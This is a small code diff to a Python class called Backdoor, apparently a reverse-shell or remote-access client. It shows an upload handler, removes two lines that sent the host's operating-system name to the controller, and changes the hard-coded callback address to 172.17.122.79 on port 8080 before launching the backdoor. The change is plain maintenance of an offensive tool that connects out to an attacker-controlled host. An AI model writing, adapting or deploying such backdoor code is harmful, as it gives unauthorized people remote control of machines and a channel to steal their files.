@@ -55,8 +55,6 @@ class Backdoor:
             return "[+] Upload successful"
 
     def run(self):
-        os_data = os.name()
-        self.reliable_send(os_data)
 
         while True:
             try:
@@ -84,7 +82,7 @@ class Backdoor:
 
 
 if __name__ == "__main__":
-    ip = "192.168.1.68"
+    ip = "172.17.122.79"
     port = 8080
 
     backdoor = Backdoor(ip, port)
